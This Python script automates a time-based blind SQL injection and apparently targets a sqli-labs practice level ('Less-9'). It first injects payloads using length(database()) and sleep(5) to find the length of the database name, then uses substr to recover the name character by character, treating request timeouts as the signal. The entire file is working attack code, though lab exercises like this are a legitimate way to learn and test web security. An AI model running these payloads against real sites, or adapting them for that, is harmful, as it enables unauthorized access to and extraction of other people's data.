#! python3

import requests
import string

def timeout(url):
    try:
        # 设置超时时间，一旦超时触发报错
        requests.get(url, timeout=5)
        return False
    except Exception as e :
        return True

def dbname(url, len):
    dbName = ""
    for i in range(1,len+1) :
        for key in string.ascii_letters :
            dbname_url = url + "?id=1'+and+if(substr(database(),%d,1)='%s',sleep(5),1)--+"%(i,key)
            print(dbname_url)
            if timeout(dbname_url) :
                dbName += key
                break
    
    return dbName

def dbnamelen(url, htmlLen):
    NUMlen = 0
    while True :
        dbnamelen_url = url + "?id=1'+and+if(length(database())=%d,sleep(5),1)--+"%(NUMlen)
        print(dbnamelen_url)

        if timeout(dbnamelen_url):
            return NUMlen
        if NUMlen >= 30 :
            return 

        NUMlen += 1        
    return

def main():
    url = "http://sqli.lab:1088/Less-9/"
    htmlLen = len(requests.get(url+"?id=1").text)

    DBnameLen = dbnamelen(url, htmlLen)
    DBname = dbname(url, DBnameLen)
    print("数据库库名长度为:%d"%(DBnameLen))
    print("数据库库名为:%s"%(DBname))


if __name__ == "__main__":
    main()